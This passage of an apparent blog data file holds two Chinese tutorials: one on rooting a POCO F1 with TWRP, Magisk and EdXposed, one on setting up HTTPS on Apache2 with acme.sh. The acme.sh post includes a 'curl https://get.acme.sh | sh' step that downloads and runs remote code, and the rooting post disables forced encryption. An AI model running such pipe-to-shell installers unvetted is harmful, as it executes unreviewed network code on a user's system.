<code>adb</code>、<code>fastboot</code> 命令工具。</p>\n<p>1、各机型对应的Recovery很可能是不同的，先找自己设备对应的下载：<a href=\"https://twrp.me/Devices/\">https://twrp.me/Devices/</a> ，比如我这里的机型打开后是这样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200703235449500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>我们点Download Links中的链接，2选1即可，反正不管美洲还是欧洲速度都很慢。进去后选最新版本的img文件，再点进去进行下载。我这里最后下载下来是：<a href=\"https://dl.twrp.me/beryllium/twrp-3.3.0-0-beryllium.img\">twrp-3.3.0-0-beryllium.img</a> ，下载完后我们把它重命名成 <code>recovery.img</code> ，后面有用。</p>\n<p>2、下载 <a href=\"https://drive.google.com/file/d/1As6z5v7NEIfOk67jXHBX34cbnFZdEjy9/view\">Disable-Force-Encryption-Treble.zip</a> ，后面在Rec中要用到，<strong>不过这个和机型有关，部分机型可能不需要</strong>，具体可查看 <a href=\"https://magisk.me/\">https://magisk.me/</a> 中的教程。</p>\n<p>3、到Magisk的官方下载页面下载最新的Zip和Apk：<a href=\"https://www.download-magisk.com/\">https://www.download-magisk.com</a> ，最终资源文件其实都在Github仓库中。我这里对应要下载的就是：</p>\n<ul>\n<li><a href=\"https://github.com/topjohnwu/Magisk/releases/download/v20.4/Magisk-v20.4.zip\">Magisk-v20.4.zip</a></li>\n<li><a href=\"https://github.com/topjohnwu/Magisk/releases/download/manager-v7.5.1/MagiskManager-v7.5.1.apk\">MagiskManager-v7.5.1.apk</a></li>\n</ul>\n<p>4、上面下载好的两个zip都拷贝到手机里，然后打开终端，开始搞事情：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 手机电脑连起来，先重启手机进入fastboot模式，命令和手动均可</span></span><br><span class=\"line\">adb reboot bootloader</span><br><span class=\"line\"><span class=\"comment\"># 然后把刚才下载并重命名好的img刷入</span></span><br><span class=\"line\">fastboot flash recovery recovery.img</span><br><span class=\"line\"><span class=\"comment\"># 执行完此就会自动进入Recovery模式</span></span><br><span class=\"line\">fastboot boot recovery.img</span><br></pre></td></tr></table></figure>\n\n<p>5、（无需安装这个zip的机型可忽略这一步）进入Rec后，可能第一次会有提示，点选 <strong>Keep Read Only</strong> ，然后在主界面点 <strong>Install</strong> ，选择刚才下载的 <strong>DisableForceEncryption_Treble.zip</strong> ，右滑Swipe安装。安装完后别急着点Reboot System，为了方便，按<strong>返回键</strong>到主界面中点击 <strong>Reboot</strong> ，选 <strong>Recovery</strong> 重启后自动进入Rec模式。</p>\n<p>6、再次进入Rec，还是点Install，然后选刚才下载的Magisk-xxx.zip，进行安装（操作图文可见官方：<a href=\"https://www.download-magisk.com/\">https://www.download-magisk.com</a>）。完事直接点Reboot System重启进入系统即可。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704004046689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>7、不出意外，进入系统后，桌面上就会出现 <strong>Magisk Manager</strong> 的图标（这里请忽略EdXposed，那是后续手动装的），说明安装成功（所以刚才下载的Apk并没有太大用哈哈，当然可以覆盖安装一下保证版本最新）。打开Manager应该可以看到两项都安装成功了。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704004304427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>8、后面就简单了，参考EdXposed官方文档（<a href=\"https://github.com/ElderDrivers/EdXposed\">https://github.com/ElderDrivers/EdXposed</a>）的Install步骤即可：</p>\n<ul>\n<li>在Magisk Manager的“下载”中安装 Riru（Riru - Core）和 Riru - EdXposed 后重启手机。</li>\n<li>去 <a href=\"https://github.com/ElderDrivers/EdXposedManager/releases\">https://github.com/ElderDrivers/EdXposedManager/releases</a> 下载EdXposed Manager的Apk来安装。大功告成！</li>\n</ul>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704012136271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><ul>\n<li>img文件重命名为recovery目的是为了覆盖系统原有的recovery，这样在用音量键上+电源键时可以手动进入到TWRP Rec。</li>\n<li>建议全程保证网络能访问谷歌（你懂的），包括手机和电脑。否则，Manager中可能会出现一直在检查更新和模块列表加载不出来也下载安装不了的情况。</li>\n<li>在上述第6步进行Magisk安装之前，某些教程会提到在Rec中 <strong>Wipe</strong> &gt; <strong>Format data</strong> 来清除手机数据后再安装，注意如果你选择了清除数据，之前拷贝到手机中的zip文件会消失，你需要重启进系统再拷贝一次才行，比较麻烦，所以我没做清除的操作，貌似也没什么问题。</li>\n<li>文件备份链接：<a href=\"https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A\">https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A</a>  密码：13av</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>记得初中的时候还在用Android 2.3，高中开始刷机，每个月都去追论坛大佬的自定义精简ROM，不亦乐乎，这一晃都过了快十年了。从以前旧版Android（支持到8.x）的Xposed到现在的EdXposed、Magisk等玩机框架，大佬些的脚步从未停歇。模块开发生态也好了很多（得益于Github及各种文档）。不过由于现在ROM厂商越来越深度的定制和限制（当然也是考虑到普通用户的安全），ROOT起来也麻烦了不少。</p>\n<p>其实我自从以前用Android 4.x时搞过机，后来也很久没接触这些了。最近把手边的测试机器（小米POCO F1，骁龙845，Android 10、MIUI 12）拿来搞了搞，发现操作过程也不是很麻烦，本文就仅作记录吧，方便以后查阅，毕竟各种链接每次都临时搜还是很费事。</p>\n<h2 id=\"Xposed\"><a href=\"#Xposed\" class=\"headerlink\" title=\"Xposed\"></a>Xposed</h2><p>由于现在Android新版本的普及，新上市的手机基本都是8.0以上了。所以以前的Xposed框架已经不适用。EdXposed团队成为了后续版本研发的继任者，从<a href=\"https://zh.wikipedia.org/zh-hans/Xposed_(%E6%A1%86%E6%9E%B6)\">Xpsoed的wikipedia</a>中可以查到交接历史：</p>\n<blockquote>\n<p>2017年7月，abforce在GitHub上发布了支持Nougat的xposed，不过此发布需在编译ROM前集成在源码中而不是以前直接卡刷的形式。<br>2017年10月，Xposed框架开始支持。[<a href=\"https://zh.wikipedia.org/zh-hans/Xposed_(%E6%A1%86%E6%9E%B6)#cite_note-3\">3]</a><br>2019年1月，ElderDrivers完成了<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>的开发。EdXp是一个Magisk模块，依赖于<a href=\"https://github.com/RikkaApps/Riru\">riru</a>框架，成功将Xposed移植到了Android Pie上，成为最接近原版Xposed的框架。<br>2019年9月，<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>正式支持Android Q。<br>2020年1月，<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>与Xposed原开发团队达成共识，成为Xposed停止更新后的官方接任者。</p>\n</blockquote>\n<p>当然，我们依然可以下载官方的资源来进行刷机：<a href=\"https://repo.xposed.info/module/de.robv.android.xposed.installer\">https://repo.xposed.info/module/de.robv.android.xposed.installer</a>，不过这不是本文重点。</p>\n<h2 id=\"TWRP-Recovery、Magisk、EdXposed\"><a href=\"#TWRP-Recovery、Magisk、EdXposed\" class=\"headerlink\" title=\"TWRP Recovery、Magisk、EdXposed\"></a>TWRP Recovery、Magisk、EdXposed</h2><p>由于我的测试机是Android 10，所以要刷EdXposed。大致思路很简单，也是最容易成功的步骤：先刷三方Rec（这里是TWRP），然后装Magisk，最后通过Magisk装EdXposed。</p>\n<p>在开始介绍步骤之前，我想说其实 <a href=\"https://magisk.me/\">https://magisk.me/</a> 是有热门刷机机型ROOT教程的，比起那些乱七八糟的二手资料要好很多，不过里面博客中的各种下载链接都打不开，后来我找到了替代的网站 <a href=\"https://www.androidjungles.com/\">https://www.androidjungles.com/</a>。本文所有下载链接都尽可能地提供官方原地址，保证权威有效（文末也会提供所有相关文件的网盘备份）。</p>\n<p><strong>下面开始：</strong></p>\n<p>0、这里默认电脑已经安装好 <code>adb</code>、<code>fastboot</code> 命令工具。</p>\n<p>1、各机型对应的Recovery很可能是不同的，先找自己设备对应的下载：<a href=\"https://twrp.me/Devices/\">https://twrp.me/Devices/</a> ，比如我这里的机型打开后是这样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200703235449500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>我们点Download Links中的链接，2选1即可，反正不管美洲还是欧洲速度都很慢。进去后选最新版本的img文件，再点进去进行下载。我这里最后下载下来是：<a href=\"https://dl.twrp.me/beryllium/twrp-3.3.0-0-beryllium.img\">twrp-3.3.0-0-beryllium.img</a> ，下载完后我们把它重命名成 <code>recovery.img</code> ，后面有用。</p>\n<p>2、下载 <a href=\"https://drive.google.com/file/d/1As6z5v7NEIfOk67jXHBX34cbnFZdEjy9/view\">Disable-Force-Encryption-Treble.zip</a> ，后面在Rec中要用到，<strong>不过这个和机型有关，部分机型可能不需要</strong>，具体可查看 <a href=\"https://magisk.me/\">https://magisk.me/</a> 中的教程。</p>\n<p>3、到Magisk的官方下载页面下载最新的Zip和Apk：<a href=\"https://www.download-magisk.com/\">https://www.download-magisk.com</a> ，最终资源文件其实都在Github仓库中。我这里对应要下载的就是：</p>\n<ul>\n<li><a href=\"https://github.com/topjohnwu/Magisk/releases/download/v20.4/Magisk-v20.4.zip\">Magisk-v20.4.zip</a></li>\n<li><a href=\"https://github.com/topjohnwu/Magisk/releases/download/manager-v7.5.1/MagiskManager-v7.5.1.apk\">MagiskManager-v7.5.1.apk</a></li>\n</ul>\n<p>4、上面下载好的两个zip都拷贝到手机里，然后打开终端，开始搞事情：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 手机电脑连起来，先重启手机进入fastboot模式，命令和手动均可</span></span><br><span class=\"line\">adb reboot bootloader</span><br><span class=\"line\"><span class=\"comment\"># 然后把刚才下载并重命名好的img刷入</span></span><br><span class=\"line\">fastboot flash recovery recovery.img</span><br><span class=\"line\"><span class=\"comment\"># 执行完此就会自动进入Recovery模式</span></span><br><span class=\"line\">fastboot boot recovery.img</span><br></pre></td></tr></table></figure>\n\n<p>5、（无需安装这个zip的机型可忽略这一步）进入Rec后，可能第一次会有提示，点选 <strong>Keep Read Only</strong> ，然后在主界面点 <strong>Install</strong> ，选择刚才下载的 <strong>DisableForceEncryption_Treble.zip</strong> ，右滑Swipe安装。安装完后别急着点Reboot System，为了方便，按<strong>返回键</strong>到主界面中点击 <strong>Reboot</strong> ，选 <strong>Recovery</strong> 重启后自动进入Rec模式。</p>\n<p>6、再次进入Rec，还是点Install，然后选刚才下载的Magisk-xxx.zip，进行安装（操作图文可见官方：<a href=\"https://www.download-magisk.com/\">https://www.download-magisk.com</a>）。完事直接点Reboot System重启进入系统即可。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704004046689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>7、不出意外，进入系统后，桌面上就会出现 <strong>Magisk Manager</strong> 的图标（这里请忽略EdXposed，那是后续手动装的），说明安装成功（所以刚才下载的Apk并没有太大用哈哈，当然可以覆盖安装一下保证版本最新）。打开Manager应该可以看到两项都安装成功了。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704004304427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>8、后面就简单了，参考EdXposed官方文档（<a href=\"https://github.com/ElderDrivers/EdXposed\">https://github.com/ElderDrivers/EdXposed</a>）的Install步骤即可：</p>\n<ul>\n<li>在Magisk Manager的“下载”中安装 Riru（Riru - Core）和 Riru - EdXposed 后重启手机。</li>\n<li>去 <a href=\"https://github.com/ElderDrivers/EdXposedManager/releases\">https://github.com/ElderDrivers/EdXposedManager/releases</a> 下载EdXposed Manager的Apk来安装。大功告成！</li>\n</ul>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200704012136271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><ul>\n<li>img文件重命名为recovery目的是为了覆盖系统原有的recovery，这样在用音量键上+电源键时可以手动进入到TWRP Rec。</li>\n<li>建议全程保证网络能访问谷歌（你懂的），包括手机和电脑。否则，Manager中可能会出现一直在检查更新和模块列表加载不出来也下载安装不了的情况。</li>\n<li>在上述第6步进行Magisk安装之前，某些教程会提到在Rec中 <strong>Wipe</strong> &gt; <strong>Format data</strong> 来清除手机数据后再安装，注意如果你选择了清除数据，之前拷贝到手机中的zip文件会消失，你需要重启进系统再拷贝一次才行，比较麻烦，所以我没做清除的操作，貌似也没什么问题。</li>\n<li>文件备份链接：<a href=\"https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A\">https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A</a>  密码：13av</li>\n</ul>\n"},{"layout":"post","title":"借助acme.sh免费开启网站的HTTPS（Apache2环境）","subtitle":"后知后觉。","date":"2020-07-08T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n> 本文仅记录无套路搞定网站HTTPS的方法。网上搜索的资料实在太杂乱了，就连**acme.sh**官方文档也不够详尽。\n\n主要就三步：生成证书、安装证书、配置SSL。下文以Ubuntu 16.04（版本不重要） + Apache2为例。默认已经安装`crontab`、`openssl`等基本工具。网站目录也是默认的 **/var/www/html/** 。\n\n### 生成证书\n\n1、先做准备工作：\n\n```bash\n# 进入服务器的用户（一般是root）目录然后创建文件夹\ncd ~\nmkdir -p ~/.acme.sh/\ncd ~/.acme.sh/\n# 配置一下别名，等下方便用\nalias acme.sh=~/.acme.sh/acme.sh\n```\n\n2、安装**acme.sh**，它可以帮你搞定免费证书：\n\n```bash\n# 此时已经在~/.acme.sh/目录下，开始安装\ncurl https://get.acme.sh | sh\n# 安装过程可能会提示socat没装，那你就装一下，装完再重新执行一次上面的安装命令\napt-get install socat\n```\n\n3、生成证书，以 **test.com** 域名作为下文示例（当然你需要改成你自己的）：\n\n```bash\nacme.sh --issue -d test.com --apache\n```\n\n到此证书生成完毕。可以看到命令执行后会提示Success。\n\n### 安装证书\n\n1、进入apache安装目录创建存放证书的文件夹：\n\n```bash\n# Ubuntu通过仓库安装的Apache默认就在这，如果你不在这，那么请自行进入相应目录\ncd /etc/apache2\n# 创建一个目录等会安装证书，其实路径都无所谓，自定义的\nmkdir ssl\n```\n\n2、开始安装证书，这是一个带参数的一次执行命令：\n\n```bash\n# 这里的3个文件名也是自定义的，自己能区分即可，但后缀最好保持.pem\nacme.sh --install-cert -d test.com \\\n--cert-file      /etc/apache2/ssl/test.com-cert.pem  \\\n--key-file       /etc/apache2/ssl/test.com-key.pem  \\\n--fullchain-file /etc/apache2/ssl/test.com-fullchain.pem \\\n--reloadcmd      \"service apache2 force-reload\"\n```\n\n### 配置SSL\n\n1、检查并开启SSL模块：\n\n```bash\na2enmod ssl\n# 然后最好重启一下Apache服务\nservice apache2 restart\n```\n\n2、修改SSL配置文件（**关键步骤**）：\n\n```bash\ncd /etc/apache2/sites-available\n# 这里为了方便直接用vim编辑了，你自己有别的方式修改也可以\nvim default-ssl.conf\n```\n\n打开default-ssl.conf文件后，重点关注这几个配置：\n\n```bash\n# 这个要是开启状态on，默认就是on的\nSSLEngine on\n# 各证书文件路径，配置为你刚才安装时自己设置的路径，一共5个，注意注释掉原有配置\nSSLCertificateFile       /etc/apache2/ssl/test.com-cert.pem\nSSLCertificateKeyFile    /etc/apache2/ssl/test.com-key.pem\n\nSSLCertificateChainFile  /etc/apache2/ssl/test.com-fullchain.pem\n\nSSLCACertificatePath     /etc/apache2/ssl/\nSSLCACertificateFile     /etc/apache2/ssl/test.com-fullchain.pem\n```\n\n记得:wq保存退出。最后刷新配置：\n\n```bash\na2ensite default-ssl.conf\n# 会提示你重载Apache服务\nservice apache2 reload\n```\n\n再用浏览器打开https://test.com，完美。当然，你需要保证你的服务器是开启了443端口的，默认情况下一般都没问题。用 `netstat -lp` 命令测试一下，看到Local Address里有https就可以了。\n\n### 开小灶\n\n一般来说，我们需要将HTTP访问强制重定向到HTTPS，咋搞？\n\n1、检查开启相关模块：\n\n```bash\na2enmod rewrite\na2enmod ssl # 这个刚才启用过了就无需再执行了\n```\n\n2、修改文件HTTP配置：\n\n```bash\nvim /etc/apache2/sites-available/000-default.conf\n```\n\n3、在80端口节点下增加如下三行（注意是增加不是直接复制粘贴啊！）：\n\n```bash\n<VirtualHost *:80>\n    RewriteEngine On\n    RewriteCond %{HTTPS} off\n    RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n</VirtualHost>\n```\n\n4、保存后重启Apache即可：\n\n```bash\nservice apache2 restart\n```\n\n### 参考\n\n- [aceme.sh文档](https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E)\n- [Deploy-ssl-certs-to-apache-server](https://github.com/acmesh-official/acme.sh/wiki/Deploy-ssl-certs-to-apache-server)\n- [http-to-https-apache-redirection](https://stackoverflow.com/questions/16200501/http-to-https-apache-redirection)\n\n文档里讲解了大部分使用说明，但一些细节没提到，会导致部署失败。\n","source":"_posts/2020-07-09-借助acme.sh免费开启网站的HTTPS（Apache2环境）.md","raw":"---\nlayout:     post\ntitle:      借助acme.sh免费开启网站的HTTPS（Apache2环境）\nsubtitle:   后知后觉。\ndate:       2020-07-09\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - 后端\n---\n\n> 本文仅记录无套路搞定网站HTTPS的方法。网上搜索的资料实在太杂乱了，就连**acme.sh**官方文档也不够详尽。\n\n主要就三步：生成证书、安装证书、配置SSL。下文以Ubuntu 16.04（版本不重要） + Apache2为例。默认已经安装`crontab`、`openssl`等基本工具。网站目录也是默认的 **/var/www/html/** 。\n\n### 生成证书\n\n1、先做准备工作：\n\n```bash\n# 进入服务器的用户（一般是root）目录然后创建文件夹\ncd ~\nmkdir -p ~/.acme.sh/\ncd ~/.acme.sh/\n# 配置一下别名，等下方便用\nalias acme.sh=~/.acme.sh/acme.sh\n```\n\n2、安装**acme.sh**，它可以帮你搞定免费证书：\n\n```bash\n# 此时已经在~/.acme.sh/目录下，开始安装\ncurl https://get.acme.sh | sh\n# 安装过程可能会提示socat没装，那你就装一下，装完再重新执行一次上面的安装命令\napt-get install socat\n```\n\n3、生成证书，以 **test.com** 域名作为下文示例（当然你需要改成你自己的）：\n\n```bash\nacme.sh --issue -d test.com --apache\n```\n\n到此证书生成完毕。可以看到命令执行后会提示Success。\n\n### 安装证书\n\n1、进入apache安装目录创建存放证书的文件夹：\n\n```bash\n# Ubuntu通过仓库安装的Apache默认就在这，如果你不在这，那么请自行进入相应目录\ncd /etc/apache2\n# 创建一个目录等会安装证书，其实路径都无所谓，自定义的\nmkdir ssl\n```\n\n2、开始安装证书，这是一个带参数的一次执行命令：\n\n```bash\n# 这里的3个文件名也是自定义的，自己能区分即可，但后缀最好保持.pem\nacme.sh --install-cert -d test.com \\\n--cert-file      /etc/apache2/ssl/test.com-cert.pem  \\\n--key-file       /etc/apache2/ssl/test.com-key.pem  \\\n--fullchain-file /etc/apache2/ssl/test.com-fullchain.pem \\\n--reloadcmd      \"service apache2 force-reload\"\n```\n\n### 配置SSL\n\n1、检查并开启SSL模块：\n\n```bash\na2enmod ssl\n# 然后最好重启一下Apache服务\nservice apache2 restart\n```\n\n2、修改SSL配置文件（**关键步骤**）：\n\n```bash\ncd /etc/apache2/sites-available\n# 这里为了方便直接用vim编辑了，你自己有别的方式修改也可以\nvim default-ssl.conf\n```\n\n打开default-ssl.conf文件后，重点关注这几个配置：\n\n```bash\n# 这个要是开启状态on，默认就是on的\nSSLEngine on\n# 各证书文件路径，配置为你刚才安装时自己设置的路径，一共5个，注意注释掉原有配置\nSSLCertificateFile       /etc/apache2/ssl/test.com-cert.pem\nSSLCertificateKeyFile    /etc/apache2/ssl/test.com-key.pem\n\nSSLCertificateChainFile  /etc/apache2/ssl/test.com-fullchain.pem\n\nSSLCACertificatePath     /etc/apache2/ssl/\nSSLCACertificateFile     /etc/apache2/ssl/test.com-fullchain.pem\n```\n\n记得:wq保存退出。最后刷新配置：\n\n```bash\na2ensite default-ssl.conf\n# 会提示你重载Apache服务\nservice apache2 reload\n```\n\n再用浏览器打开https://test.com，完美。当然，你需要保证你的服务器是开启了443端口的，默认情况下一般都没问题。用 `netstat -lp` 命令测试一下，看到Local Address里有https就可以了。\n\n### 开小灶\n\n一般来说，我们需要将HTTP访问强制重定向到HTTPS，咋搞？\n\n1、检查开启相关模块：\n\n```bash\na2enmod rewrite\na2enmod ssl # 这个刚才启用过了就无需再执行了\n```\n\n2、修改文件HTTP配置：\n\n```bash\nvim /etc/apache2/sites-available/000-default.conf\n```\n\n3、在80端口节点下增加如下三行（注意是增加不是直接复制粘贴啊！）：\n\n```bash\n<VirtualHost *:80>\n    RewriteEngine On\n    RewriteCond %{HTTPS} off\n    RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n</VirtualHost>\n```\n\n4、保存后重启Apache即可：\n\n```bash\nservice apache2 restart\n```\n\n### 参考\n\n- [aceme.sh文档](https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E)\n- [Deploy-ssl-certs-to-apache-server](https://github.com/acmesh-official/acme.sh/wiki/Deploy-ssl-certs-to-apache-server)\n- [http-to-https-apache-redirection](https://stackoverflow.com/questions/16200501/http-to-https-apache-redirection)\n\n文档里讲解了大部分使用说明，但一些细节没提到，会导致部署失败。\n","slug":"借助acme.sh免费开启网站的HTTPS（Apache2环境）","published":1,"updated":"2024-03-25T07:31:25.863Z","comments":1,"photos":[],"link":"","_id":"cluaufh150035the6f0fjguw3","content":"<blockquote>\n<p>本文仅记录无套路搞定网站HTTPS的方法。网上搜索的资料实在太杂乱了，就连<strong>acme.sh</strong>官方文档也不够详尽。</p>\n</blockquote>\n<p>主要就三步：生成证书、安装证书、配置SSL。下文以Ubuntu 16.04（版本不重要） + Apache2为例。默认已经安装<code>crontab</code>、<code>openssl</code>等基本工具。网站目录也是默认的 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;</strong> 。</p>\n<h3 id=\"生成证书\"><a href=\"#生成证书\" class=\"headerlink\" title=\"生成证书\"></a>生成证书</h3><p>1、先做准备工作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入服务器的用户（一般是root）目录然后创建文件夹</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.acme.sh/</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/.acme.sh/</span><br><span class=\"line\"><span class=\"comment\"># 配置一下别名，等下方便用</span></span><br><span class=\"line\"><span class=\"built_in\">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br></pre></td></tr></table></figure>\n\n<p>2、安装<strong>acme.sh</strong>，它可以帮你搞定免费证书：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 此时已经在~/.acme.sh/目录下，开始安装</span></span><br><span class=\"line\">curl https://get.acme.sh | sh</span><br><span class=\"line\"><span class=\"comment\"># 安装过程可能会提示socat没装，那你就装一下，装完再重新执行一次上面的安装命令</span></span><br><span class=\"line\">apt-get install socat</span><br></pre></td></tr></table></figure>\n\n<p>3、生成证书，以 <strong>test.com</strong> 域名作为下文示例（当然你需要改成你自己的）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acme.sh --issue -d test.com --apache</span><br></pre></td></tr></table></figure>\n\n<p>到此证书生成完毕。可以看到命令执行后会提示Success。</p>\n<h3 id=\"安装证书\"><a href=\"#安装证书\" class=\"headerlink\" title=\"安装证书\"></a>安装证书</h3><p>1、进入apache安装目录创建存放证书的文件夹：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Ubuntu通过仓库安装的Apache默认就在这，如果你不在这，那么请自行进入相应目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /etc/apache2</span><br><span class=\"line\"><span class=\"comment\"># 创建一个目录等会安装证书，其实路径都无所谓，自定义的</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ssl</span><br></pre></td></tr></table></figure>\n\n<p>2、开始安装证书，这是一个带参数的一次执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里的3个文件名也是自定义的，自己能区分即可，但后缀最好保持.pem</span></span><br><span class=\"line\">acme.sh --install-cert -d test.com \\</span><br><span class=\"line\">--cert-file      /etc/apache2/ssl/test.com-cert.pem  \\</span><br><span class=\"line\">--key-file       /etc/apache2/ssl/test.com-key.pem  \\</span><br><span class=\"line\">--fullchain-file /etc/apache2/ssl/test.com-fullchain.pem \\</span><br><span class=\"line\">--reloadcmd      <span class=\"string\">&quot;service apache2 force-reload&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置SSL\"><a href=\"#配置SSL\" class=\"headerlink\" title=\"配置SSL\"></a>配置SSL</h3><p>1、检查并开启SSL模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2enmod ssl</span><br><span class=\"line\"><span class=\"comment\"># 然后最好重启一下Apache服务</span></span><br><span class=\"line\">service apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>2、修改SSL配置文件（<strong>关键步骤</strong>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/apache2/sites-available</span><br><span class=\"line\"><span class=\"comment\"># 这里为了方便直接用vim编辑了，你自己有别的方式修改也可以</span></span><br><span class=\"line\">vim default-ssl.conf</span><br></pre></td></tr></table></figure>\n\n<p>打开default-ssl.conf文件后，重点关注这几个配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 